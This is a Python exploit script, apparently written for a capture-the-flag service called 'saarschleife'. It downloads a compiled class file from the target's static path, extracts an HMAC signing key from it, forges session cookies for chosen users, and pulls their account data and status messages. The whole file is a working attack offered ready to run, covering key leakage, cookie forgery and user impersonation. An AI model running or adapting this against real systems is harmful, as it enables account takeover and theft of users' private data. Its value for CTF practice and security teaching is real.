import binascii
import hashlib
import hmac
import urllib

import requests

try:
	from exploits.common import *
except ImportError:
	from common import *


def fake_cookie(key: bytes, username: str):
	msg = 'username=%23s{}'.format(username)
	mac = hmac.new(key, msg.encode('utf-8'), hashlib.sha256).hexdigest()
	return urllib.parse.quote(msg + '/' + mac) + '; path=/'


def attack_leak_key(target: str):
	response = requests.get('http://{}/static/saarschleife/KeyKt.class'.format(target))
	if response.status_code != 200:
		print(response.status_code)
		return
	key = binascii.unhexlify(re.search(b'[a-fA-F0-9]{64}', response.content)[0])
	print('Extracted key:', repr(key))

	interesting_visitors = get_interesting_visitors(requests.session(), target, True)

	for username in interesting_visitors:
		print('--- {} ---'.format(username))
		cookies = {'saarschleife_session_id': fake_cookie(key, username)}
		response = requests.get('http://{}/api/me'.format(target), cookies=cookies)
		print(response.text)
		response = requests.get('http://{}/api/statusmessage/{}'.format(target, username), cookies=cookies)
		print(response.text)


if __name__ == '__main__':
	attack_leak_key(default_target())
